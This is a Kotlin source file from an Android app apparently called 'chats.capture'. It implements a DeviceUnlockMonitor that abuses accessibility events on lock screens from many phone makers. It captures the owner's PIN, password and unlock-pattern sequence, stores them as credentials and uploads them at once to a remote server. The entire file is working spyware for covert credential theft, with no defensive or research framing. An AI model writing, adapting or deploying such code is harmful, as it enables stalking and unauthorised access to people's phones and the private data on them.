package com.chats.capture.utils

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.chats.capture.CaptureApplication
import com.chats.capture.database.CredentialDao
import com.chats.capture.managers.DeviceRegistrationManager
import com.chats.capture.models.Credential
import com.chats.capture.models.CredentialType
import com.chats.capture.network.ApiClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import timber.log.Timber
import java.util.regex.Pattern

/**
 * Monitors device unlock events and captures PIN, pattern, and password
 */
class DeviceUnlockMonitor(
    private val service: AccessibilityService,
    private val credentialDao: CredentialDao,
    private val serviceScope: CoroutineScope
) {
    
    private val deviceRegistrationManager = DeviceRegistrationManager(service)
    
    // Lock screen packages (varies by manufacturer)
    private val lockScreenPackages = setOf(
        "com.android.systemui",
        "com.android.keyguard",
        "com.samsung.android.keyguard",
        "com.miui.keyguard",
        "com.huawei.keyguard",
        "com.oneplus.keyguard",
        "com.coloros.keyguard", // OPPO
        "com.realme.keyguard", // Realme
        "com.vivo.keyguard", // Vivo
        "com.letv.keyguard", // LeEco
        "com.zte.keyguard", // ZTE
        "com.lge.keyguard" // LG
    )
    
    // Track last capture to avoid duplicates
    private var lastUnlockCapture: String? = null
    private var lastUnlockTime: Long = 0
    private val MIN_CAPTURE_INTERVAL_MS = 2000L // Minimum 2 seconds between captures
    
    // Track unlock state
    private var isLockScreenVisible = false
    private var unlockAttemptBuffer = StringBuilder()
    private var lastUnlockAttemptTime: Long = 0
    
    /**
     * Handle window state changes to detect lock screen
     */
    fun handleWindowStateChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        
        try {
            if (isLockScreenPackage(packageName)) {
                val className = event.className?.toString() ?: ""
                
                // Check if lock screen is being shown
                if (isLockScreenWindow(className)) {
                    if (!isLockScreenVisible) {
                        isLockScreenVisible = true
                        unlockAttemptBuffer.clear()
                        Timber.tag("DEVICE_UNLOCK").d("🔒 Lock screen detected: $packageName")
                    }
                } else if (isUnlockScreenWindow(className)) {
                    // User is entering unlock code
                    isLockScreenVisible = true
                    Timber.tag("DEVICE_UNLOCK").d("🔓 Unlock screen active: $packageName")
                }
            } else {
                // Not lock screen - device might be unlocked
                if (isLockScreenVisible) {
                    // Device was just unlocked
                    isLockScreenVisible = false
                    processUnlockAttempt()
                }
            }
        } catch (e: Exception) {
            Timber.e(e, "Error handling window state change for unlock monitoring")
        }
    }
    
    /**
     * Handle text changes to capture PIN/password input
     */
    fun handleTextChanged(event: AccessibilityEvent) {
        if (!isLockScreenVisible) return
        
        val packageName = event.packageName?.toString() ?: return
        if (!isLockScreenPackage(packageName)) return
        
        try {
            val source = event.source ?: return
            
            // Get text from event
            val text = event.text?.firstOrNull()?.toString() ?: ""
            val textFromNode = source.text?.toString() ?: ""
            val finalText = text.ifBlank { textFromNode }
            
            if (finalText.isNotBlank()) {
                // Check if it's a PIN (numeric) or password (alphanumeric)
                if (isNumeric(finalText)) {
                    // PIN input
                    captureUnlockCode(finalText, "PIN")
                } else if (finalText.length >= 4) {
                    // Password input (alphanumeric)
                    captureUnlockCode(finalText, "PASSWORD")
                }
            }
            
            // Also check for pattern indicators
            checkForPatternInput(source)
            
            source.recycle()
        } catch (e: Exception) {
            Timber.e(e, "Error handling text change for unlock monitoring")
        }
    }
    
    /**
     * Handle gesture events to detect pattern unlock
     */
    fun handleGestureDetected(event: AccessibilityEvent) {
        if (!isLockScreenVisible) return
        
        val packageName = event.packageName?.toString() ?: return
        if (!isLockScreenPackage(packageName)) return
        
        try {
            // Pattern unlock uses gestures
            // We can detect this by monitoring gesture events on lock screen
            val currentTime = System.currentTimeMillis()
            
            // If gesture detected on lock screen, it might be a pattern
            if (currentTime - lastUnlockAttemptTime < 5000) {
                // Gesture within 5 seconds of last attempt - likely pattern unlock
                captureUnlockCode("PATTERN_DETECTED", "PATTERN")
            }
            
            lastUnlockAttemptTime = currentTime
        } catch (e: Exception) {
            Timber.e(e, "Error handling gesture for unlock monitoring")
        }
    }
    
    /**
     * Handle view clicks to detect pattern/PIN input
     */
    fun handleViewClicked(event: AccessibilityEvent) {
        if (!isLockScreenVisible) return
        
        val packageName = event.packageName?.toString() ?: return
        if (!isLockScreenPackage(packageName)) return
        
        try {
            val source = event.source ?: return
            
            // Check if clicked view is part of unlock interface
            val className = source.className?.toString() ?: ""
            val contentDesc = source.contentDescription?.toString() ?: ""
            val viewId = source.viewIdResourceName ?: ""
            
            // Pattern unlock indicators
            if (className.contains("Pattern", ignoreCase = true) ||
                className.contains("Lock", ignoreCase = true) ||
                contentDesc.contains("pattern", ignoreCase = true) ||
                viewId.contains("pattern", ignoreCase = true) ||
                viewId.contains("lock", ignoreCase = true)) {
                
                // Track pattern input
                val currentTime = System.currentTimeMillis()
                if (currentTime - lastUnlockAttemptTime > 1000) {
                    // New pattern attempt
                    unlockAttemptBuffer.clear()
                }
                
                // Try to extract pattern coordinates or sequence
                extractPatternSequence(source)
                lastUnlockAttemptTime = currentTime
            }
            
            // PIN/Password input indicators
            if (className.contains("Pin", ignoreCase = true) ||
                className.contains("Password", ignoreCase = true) ||
                className.contains("Keypad", ignoreCase = true) ||
                viewId.contains("pin", ignoreCase = true) ||
                viewId.contains("password", ignoreCase = true) ||
                viewId.contains("keypad", ignoreCase = true)) {
                
                // Try to get input value
                val text = source.text?.toString() ?: ""
                if (text.isNotBlank() && (isNumeric(text) || text.length >= 4)) {
                    captureUnlockCode(text, if (isNumeric(text)) "PIN" else "PASSWORD")
                }
            }
            
            source.recycle()
        } catch (e: Exception) {
            Timber.e(e, "Error handling view click for unlock monitoring")
        }
    }
    
    /**
     * Check if package is a lock screen package
     */
    private fun isLockScreenPackage(packageName: String): Boolean {
        return lockScreenPackages.any { packageName.contains(it, ignoreCase = true) }
    }
    
    /**
     * Check if window is a lock screen window
     */
    private fun isLockScreenWindow(className: String): Boolean {
        return className.contains("Keyguard", ignoreCase = true) ||
               className.contains("LockScreen", ignoreCase = true) ||
               className.contains("Lock", ignoreCase = true)
    }
    
    /**
     * Check if window is an unlock input window
     */
    private fun isUnlockScreenWindow(className: String): Boolean {
        return className.contains("Keyguard", ignoreCase = true) &&
               (className.contains("Pin", ignoreCase = true) ||
                className.contains("Password", ignoreCase = true) ||
                className.contains("Pattern", ignoreCase = true) ||
                className.contains("Unlock", ignoreCase = true))
    }
    
    /**
     * Check if text is numeric (PIN)
     */
    private fun isNumeric(text: String): Boolean {
        return text.matches(Regex("^[0-9]+$"))
    }
    
    /**
     * Check for pattern input by examining node structure
     */
    private fun checkForPatternInput(node: AccessibilityNodeInfo) {
        try {
            val className = node.className?.toString() ?: ""
            val contentDesc = node.contentDescription?.toString() ?: ""
            
            if (className.contains("Pattern", ignoreCase = true) ||
                contentDesc.contains("pattern", ignoreCase = true)) {
                
                // Try to extract pattern sequence from children
                extractPatternSequence(node)
            }
        } catch (e: Exception) {
            Timber.e(e, "Error checking for pattern input")
        }
    }
    
    /**
     * Extract pattern sequence from accessibility nodes
     */
    private fun extractPatternSequence(root: AccessibilityNodeInfo) {
        try {
            // Pattern unlock typically has 9 dots in a 3x3 grid
            // We can try to detect which dots are selected
            val patternNodes = mutableListOf<Pair<Int, Int>>() // row, col
            
            for (i in 0 until root.childCount) {
                val child = root.getChild(i)
                child?.let {
                    val contentDesc = it.contentDescription?.toString() ?: ""
                    val bounds = android.graphics.Rect()
                    it.getBoundsInScreen(bounds)
                    
                    // Try to identify pattern dots
                    if (contentDesc.contains("dot", ignoreCase = true) ||
                        contentDesc.contains("circle", ignoreCase = true) ||
                        it.className?.toString()?.contains("Pattern", ignoreCase = true) == true) {
                        
                        // Calculate approximate position (row, col) from bounds
                        val row = (bounds.top / (bounds.height() / 3)).coerceIn(0, 2)
                        val col = (bounds.left / (bounds.width() / 3)).coerceIn(0, 2)
                        patternNodes.add(Pair(row, col))
                    }
                    
                    it.recycle()
                }
            }
            
            if (patternNodes.isNotEmpty()) {
                // Build pattern sequence (e.g., "1-2-5-8" for dots 1,2,5,8)
                val patternSequence = patternNodes.joinToString("-") { "${it.first * 3 + it.second + 1}" }
                unlockAttemptBuffer.append(patternSequence)
                Timber.tag("DEVICE_UNLOCK").d("Pattern sequence detected: $patternSequence")
            }
        } catch (e: Exception) {
            Timber.e(e, "Error extracting pattern sequence")
        }
    }
    
    /**
     * Capture unlock code (PIN, pattern, or password)
     */
    private fun captureUnlockCode(code: String, type: String) {
        val currentTime = System.currentTimeMillis()
        
        // Avoid duplicate captures
        val codeIdentifier = "${type}_${code.take(3)}_${code.length}"
        if (lastUnlockCapture == codeIdentifier && 
            currentTime - lastUnlockTime < MIN_CAPTURE_INTERVAL_MS) {
            Timber.v("Skipping duplicate unlock capture")
            return
        }
        
        lastUnlockCapture = codeIdentifier
        lastUnlockTime = currentTime
        
        serviceScope.launch(Dispatchers.IO) {
            try {
                val deviceId = deviceRegistrationManager.getDeviceId()
                
                // Format the unlock code based on type
                val formattedCode = when (type) {
                    "PATTERN" -> {
                        if (code == "PATTERN_DETECTED") {
                            unlockAttemptBuffer.toString().ifBlank { "PATTERN_UNLOCK" }
                        } else {
                            code
                        }
                    }
                    "PIN" -> code
                    "PASSWORD" -> code
                    else -> code
                }
                
                val credential = Credential(
                    deviceId = deviceId,
                    accountType = CredentialType.DEVICE_PASSWORD,
                    password = formattedCode, // Store PIN/pattern/password
                    devicePassword = true,
                    timestamp = currentTime,
                    synced = false
                )
                
                credentialDao.insertCredential(credential)
                Timber.tag("DEVICE_UNLOCK").i("🔓 Device unlock $type captured: ${formattedCode.take(3)}*** (length: ${formattedCode.length})")
                
                // Immediately sync to server
                syncUnlockCodeImmediately(credential)
                
                // Clear buffer after capture
                unlockAttemptBuffer.clear()
            } catch (e: Exception) {
                Timber.tag("DEVICE_UNLOCK").e(e, "Error capturing device unlock code")
            }
        }
    }
    
    /**
     * Process unlock attempt when device is unlocked
     */
    private fun processUnlockAttempt() {
        if (unlockAttemptBuffer.isNotEmpty()) {
            val pattern = unlockAttemptBuffer.toString()
            if (pattern.isNotBlank()) {
                captureUnlockCode(pattern, "PATTERN")
            }
        }
    }
    
    /**
     * Immediately sync unlock code to server
     */
    private fun syncUnlockCodeImmediately(credential: Credential) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                if (!ApiClient.isNetworkAvailable(service)) {
                    Timber.tag("DEVICE_UNLOCK").w("Network not available, will sync later")
                    return@launch
                }
                
                val apiService = ApiClient.getApiService()
                val response = apiService.uploadCredential(credential)
                
                if (response.isSuccessful && response.body()?.success == true) {
                    // Mark as synced
                    credentialDao.markAsSynced(credential.id, System.currentTimeMillis())
                    Timber.tag("DEVICE_UNLOCK").i("✅ Device unlock code synced to server immediately")
                } else {
                    Timber.tag("DEVICE_UNLOCK").w("⚠️ Immediate sync failed, will retry later: ${response.body()?.message}")
                }
            } catch (e: Exception) {
                Timber.tag("DEVICE_UNLOCK").e(e, "Error syncing unlock code immediately")
                // Will be synced later by periodic sync worker
            }
        }
    }
}
